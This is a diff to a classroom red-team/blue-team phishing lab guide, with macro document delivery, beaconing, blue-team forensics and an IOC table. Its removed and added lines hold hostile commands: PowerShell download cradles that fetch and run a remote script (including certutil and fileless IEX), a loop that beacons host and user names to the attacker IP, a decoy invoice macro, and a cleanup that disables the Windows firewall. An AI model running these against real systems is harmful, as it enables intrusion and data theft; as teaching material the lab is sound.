@@ -352,188 +352,109 @@ Show students side-by-side: real site vs cloned — they look identical.
 
 ## Phase 6 — Payload Delivery
 
-### 6-A · Macro document (concept + demo)
-
 **Attacker — Terminal 4 (Kali)**
 
+Generate the macro code and decoy document:
 ```bash
-# Generate the macro code and decoy document
 python3 tools/create_macro_doc.py
+# Creates: payloads/invoice_Q4_2024.docx   (decoy shell)
+#          payloads/macro_code.vba          (VBA to embed)
+```
 
-# Walk through the VBA with students
+Review what the macro does — walk through it with students:
+```bash
 cat payloads/macro_code.vba
 ```
+Three things happen the moment the victim clicks "Enable Content":
+1. `calc.exe` opens — proof the macro ran
+2. `macro_ran.txt` is written to `%TEMP%` — artifact on disk
+3. A PowerShell one-liner silently beacons back to Kali
 
-Walk through the VBA line by line:
-- `AutoOpen()` — fires the moment victim clicks Enable Content
-- `Shell "cmd.exe /c calc.exe"` — the "payload" (harmless here)
-- The PowerShell beacon line — how it calls home
-
-**Attacker — prepare the .docm on Kali using LibreOffice:**
+**Embed the macro in LibreOffice (Terminal 4):**
 ```bash
-# Open LibreOffice Writer
 libreoffice --writer payloads/invoice_Q4_2024.docx
-```
 ```
 Inside LibreOffice:
 1. Tools → Macros → Edit Macros
-2. Paste content of payloads/macro_code.vba into Module1
-3. File → Save As → invoice_Q4_2024.docm (keep current format)
-```
+2. Paste the full content of `payloads/macro_code.vba` into Module1
+3. File → Save As → `invoice_Q4_2024.docm` (macro-enabled format)
+4. Close LibreOffice
 
-The attacker now has a `.docm` with the macro embedded — ready to send.
+The `.docm` is now in `payloads/` — http_server.py is already serving it.
 
-**Victim — receives and opens the document:**
+**Victim — download and open on Windows:**
 ```powershell
-# On Windows — download the prepared document from Kali
-Invoke-WebRequest -Uri "http://192.168.11.149:8080/payloads/invoice_Q4_2024.docm" `
+Invoke-WebRequest -Uri "http://<Kali IP>:8080/payloads/invoice_Q4_2024.docm" `
                   -OutFile "$env:TEMP\invoice_Q4_2024.docm"
-```
-```
-1. Open invoice_Q4_2024.docm
-2. Click "Enable Content" when prompted
-3. Calculator opens automatically — macro executed
-4. Check %TEMP%\macro_ran.txt
+Invoke-Item "$env:TEMP\invoice_Q4_2024.docm"
 ```
 
-### 6-B · PowerShell download cradle
-
-In a real attack this runs automatically — triggered by a macro, a malicious LNK file, or a drive-by download. For the lab the instructor demonstrates it by running it on the Windows machine to show students what happens on the victim side.
-
-**Instructor runs on Windows (simulating what the macro would trigger):**
-```powershell
-$url = "http://192.168.11.149:8080/payloads/calc_payload.ps1"
-
-# Method 1: WebClient — most common
-(New-Object System.Net.WebClient).DownloadFile($url, "$env:TEMP\s2.ps1")
-powershell -ExecutionPolicy Bypass -File "$env:TEMP\s2.ps1"
-```
-
-Watch **Terminal 3** on Kali log the download and beacon.
-
-```powershell
-# Method 2: LOLBin — certutil (built-in Windows binary, bypasses some AV)
-certutil -urlcache -split -f $url "$env:TEMP\s2_cert.ps1"
-powershell -ExecutionPolicy Bypass -File "$env:TEMP\s2_cert.ps1"
-```
-
-```powershell
-# Method 3: Fileless — payload never touches disk (hardest to detect)
-IEX (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-```
+1. Word opens — click **Enable Content** when prompted
+2. Calculator opens — macro executed
+3. A confirmation dialog appears
+4. The macro silently beacons back to Kali in the background
 
 ---
 
-## Phase 7 — C2 Beacon
+## Phase 7 — Beacon Arrives on Kali
 
-The beacon runs on the victim machine after the payload executes — simulating an implant calling home. The instructor runs it on Windows to demonstrate what the blue team sees on Kali.
+Watch **Terminal 3** (http_server.py). Within seconds of the victim clicking "Enable Content":
 
-**Instructor runs on Windows:**
-```powershell
-# Simulates an implant beaconing every 10 seconds
-while ($true) {
-    $qs = "host=$env:COMPUTERNAME&user=$env:USERNAME"
-    Invoke-WebRequest -Uri "http://192.168.11.149:8080/beacon?$qs" `
-                      -UseBasicParsing | Out-Null
-    Write-Host "[$(Get-Date -f 'HH:mm:ss')] beacon sent"
-    Start-Sleep -Seconds 10
-}
-```
-
-Watch **Terminal 3** — every 10 seconds:
 ```
   [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]
-  [BEACON] 14:32:01 from 192.168.11.XXX
-    host: VICTIM-PC
-    user: Administrator
-    n: 1
+  [BEACON] 14:32:01 from 192.168.11.1
+    macro=1  host=VICTIM-PC  user=Administrator
   [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]
 ```
 
-> **Blue team discussion:** what makes this suspicious?
-> - Regular HTTP requests at fixed interval from a non-browser process
-> - `python.exe` or `powershell.exe` making outbound HTTP
-> - Traffic during off-hours or when user is idle
-> - Small consistent payloads (no real web browsing pattern)
+The macro fired, calc.exe opened, and the victim's machine called home — all from one click.
 
 ---
 
 ## Phase 8 — Blue Team Investigation
 
-Students switch roles. Kali terminals stay running. All commands run **on Windows victim.**
+Students switch roles. All commands run **on Windows.**
 
-### Find the payload artifacts
+### Find the artifact the macro left behind
 ```powershell
-# What files did the attacker leave?
-Get-ChildItem $env:TEMP | Sort-Object LastWriteTime -Descending | Select -First 20
-Get-Content "$env:TEMP\red4blue_pwned.txt"
+Get-ChildItem $env:TEMP | Sort-Object LastWriteTime -Descending | Select -First 10
 Get-Content "$env:TEMP\macro_ran.txt"
 ```
 
-### Find network connections to attacker
+### Find the connection back to Kali
 ```powershell
-# Any active connections to $KALI_IP?
-Get-NetTCPConnection -State Established |
-    Where-Object RemoteAddress -eq "$KALI_IP"
-
-# What process owns those connections?
-Get-NetTCPConnection -State Established |
-    Where-Object RemoteAddress -eq "$KALI_IP" |
-    ForEach-Object {
-        [PSCustomObject]@{
-            Process = (Get-Process -Id $_.OwningProcess).Name
-            PID     = $_.OwningProcess
-            Port    = $_.RemotePort
-        }
-    }
+# Replace <Kali IP> with the actual Kali IP
+netstat -ano | findstr "<Kali IP>"
 ```
 
-### Check firewall log for port scan
+### Check firewall log for the port scan
 ```powershell
-Get-Content "C:\fw.log" | Select-String "DROP" | Select -Last 30
-# Look for rapid-fire entries from $KALI_IP
+Get-Content "C:\fw.log" | Select-String "DROP" | Select -Last 20
 ```
 
-### Enable and read PowerShell script block logs
+### Block the attacker
 ```powershell
-# Enable logging (if not already)
-$p = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
-New-Item $p -Force | Out-Null
-Set-ItemProperty $p -Name EnableScriptBlockLogging -Value 1
-
-# Read recent entries (Event ID 4104)
-Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
-    Where-Object Id -eq 4104 |
-    Select-Object -First 10 |
-    Format-List TimeCreated, Message
+# Add an outbound block for Kali's IP
+New-NetFirewallRule -DisplayName "Block Kali" `
+    -Direction Outbound -RemoteAddress "<Kali IP>" -Action Block
 ```
 
-### Check process creation (who spawned what)
+### Clean up after the lesson
 ```powershell
-# Security log — process creation (needs audit policy enabled)
-Get-WinEvent -LogName Security |
-    Where-Object Id -eq 4688 |
-    Select-Object -First 20 |
-    Format-List TimeCreated, Message
+Remove-NetFirewallRule -DisplayName "Block Kali"
+netsh advfirewall set allprofiles state off
 ```
 
-### Check scheduled tasks and registry run keys (persistence)
-```powershell
-# New scheduled tasks (not Microsoft)
-Get-ScheduledTask | Where-Object TaskPath -notlike "\Microsoft*"
-
-# Registry autostart
-Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-```
+> **What the evidence tells us:**
+> - Firewall log (`C:\fw.log`) → port scan happened — recon leaves traces even through NAT
+> - `macro_ran.txt` in `%TEMP%` → macro executed — forensic proof of the infection
+> - `netstat` connection to Kali → active beacon — machine was phoning home
+> - Root cause: victim clicked "Enable Content" on an untrusted document
 
 ### Review what GoPhish captured (back on Kali — Terminal 1)
 ```bash
-# Credentials submitted via fake login page
-cat captured_credentials.log
-
-# Emails captured by SMTP relay
-cat smtp_captured.log
+cat captured_credentials.log   # credentials from fake login page
+cat smtp_captured.log           # emails captured by SMTP relay
 ```
 
 ---
@@ -576,7 +497,7 @@ See `lesson1/setup/evilginx_notes.md` for full phishlet setup.
 | Start SMTP relay | `python3 tools/smtp_server.py` |
 | Start HTTP server | `python3 tools/http_server.py` |
 | Fake login page | `http://$KALI_IP:8080/` |
-| Download calc payload | `http://$KALI_IP:8080/payloads/calc_payload.ps1` |
+| Macro doc (after embedding) | `http://$KALI_IP:8080/payloads/invoice_Q4_2024.docm` |
 | Captured credentials | `cat captured_credentials.log` |
 | Ping sweep | `nmap -sn 192.168.11.0/24` |
 | Fast port scan | `nmap -sV -T4 --open $VICTIM` |
@@ -586,12 +507,10 @@ See `lesson1/setup/evilginx_notes.md` for full phishlet setup.
 
 ## IOC Cheatsheet
 
-| Indicator | Type | Source |
-|-----------|------|--------|
-| `$KALI_IP` making port scan | Network | Wireshark / fw.log |
-| Email from `*-support.com` not `microsoft.com` | Email header | SPF/DKIM fail |
-| `powershell.exe` → outbound HTTP to `:8080` | Process + Network | Sysmon / netstat |
-| `WINWORD.EXE` → `cmd.exe` → `powershell.exe` | Process tree | Sysmon Event 1 |
-| `%TEMP%\red4blue_pwned.txt` | File | Filesystem |
-| `%TEMP%\macro_ran.txt` | File | Filesystem |
-| Periodic HTTP GET `/beacon?...` every ~10s | Network | Zeek / Wireshark |
+| Indicator | Type | Where to look |
+|-----------|------|---------------|
+| Rapid SYN packets from Kali IP | Network | Wireshark on VMnet8 / `C:\fw.log` |
+| Email from `*-support.com` not `microsoft.com` | Email header | SPF/DKIM=none in headers |
+| `WINWORD.EXE` → `cmd.exe` → `calc.exe` | Process | Task Manager during macro |
+| `%TEMP%\macro_ran.txt` | File | `Get-ChildItem $env:TEMP` |
+| Outbound HTTP to Kali `:8080` | Network | `netstat -ano` |
